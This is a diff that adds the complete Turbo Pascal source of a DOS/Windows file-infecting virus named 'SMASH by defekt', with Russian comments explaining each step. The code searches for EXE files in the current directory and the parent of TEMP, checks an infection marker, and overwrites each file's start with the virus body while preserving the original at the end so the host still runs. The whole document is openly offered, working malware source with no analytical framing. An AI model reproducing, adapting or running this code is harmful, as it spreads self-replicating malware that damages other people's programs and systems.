@@ -1,0 +1,70 @@
+{$S-,I-}             {Команда компилятору на уменьшение кода вируса}
+{$M 5000,0,5000}
+uses dos;            {Используем функции DOSa}
+const mel = 4257;    {Длина вируса}
+abvi = 'SMASH by defekt';   {Наши копирайты}
+var me,we : file;
+met,wet : array[1..mel] of byte;
+dir : string;
+s_win : byte;
+procedure inf;                       {Заражаем файл}
+var a : char;
+begin
+a := '';                            {Метка зараженности}
+seek(we,0);                          {Перешли в начало файла}
+blockread(we,wet,mel);               {Считали начало файла в массив wet}
+seek(we,filesize(we));               {Нашли конец файла}
+blockwrite(we,wet,mel);              {Записали этот массив туда}
+blockwrite(we,a,1);                  {Поставили метку зараженности}
+seek(we,0);                          {Опять в начало}
+blockwrite(we,met,mel);              {Записали тело виря}
+close(we);                           {Закрыли файлик}
+end;
+procedure chk(path : string);        {Проверка зараженности}
+var b : byte;
+begin
+assign(we,path);
+reset(we,1);
+seek(we,filesize(we)-1);             {Нашли последний байт файла}
+blockread(we,b,1);
+if b= ord('') then begin s_win := s_win-1; exit;end else inf;  {Если он равен нашей метке, след., заражены}
+end;
+procedure findf;                     {Поиск файлов}
+var SR : searchrec;
+begin
+findfirst('*.exe',$3F,SR);           {Ищем EXE}
+while doserror=0 do begin
+if s_win=5 then exit;                {Если 6 файл, выходим}
+chk(SR.name);                        {Иначе на заражение}
+s_win := s_win+1;                    {Счетчик зараженных файлов}
+findnext(SR);
+end;
+end;
+procedure le;                         {Восстанавливаем файл-носитель}
+var i : byte;
+p : string;
+begin
+assign(we,paramstr(0));
+reset(we,1);
+blockread(we,met,mel);                {Считали вирус в массив met}
+if filesize(we) <= mel then exit;     {Если длина фала меньше длины вируса - выходим}
+seek(we,filesize(we)-1);              {Ищем последний байт}
+truncate(we);                         {Удаляем его}
+seek(we,filesize(we)-mel);            {Ищем сохраненное начало фала-носителя}
+blockread(we,wet,mel);                {Считываем его}
+truncate(we);                         {Отрезаем}
+seek(we,0);                           {В начало фала}
+blockwrite(we,wet,mel);               {Записываем сохраненное начало на место тело вируса}
+close(we);
+for i := 1 to paramcount do           {Собираем наши параметры}
+p := p + paramstr(i);
+exec(paramstr(0),p);                  {Запускаем восстановленый файл-носитель с параметрами}
+end;
+begin
+le;                                   {Идем на восстановление файла-носителя}
+findf;                                {Начинаем искать фалы для заражения}
+dir := GetEnv('TEMP');                {Ищем дерикторию TEMP}
+chdir(dir);                           {Переходим туда}
+chdir('..');                          {Переходим на уровень выше (в системную дерикторию)}
+findf;                                {Заражаем файлы там}
+end.                                  {КОНЕЦ!!!!}
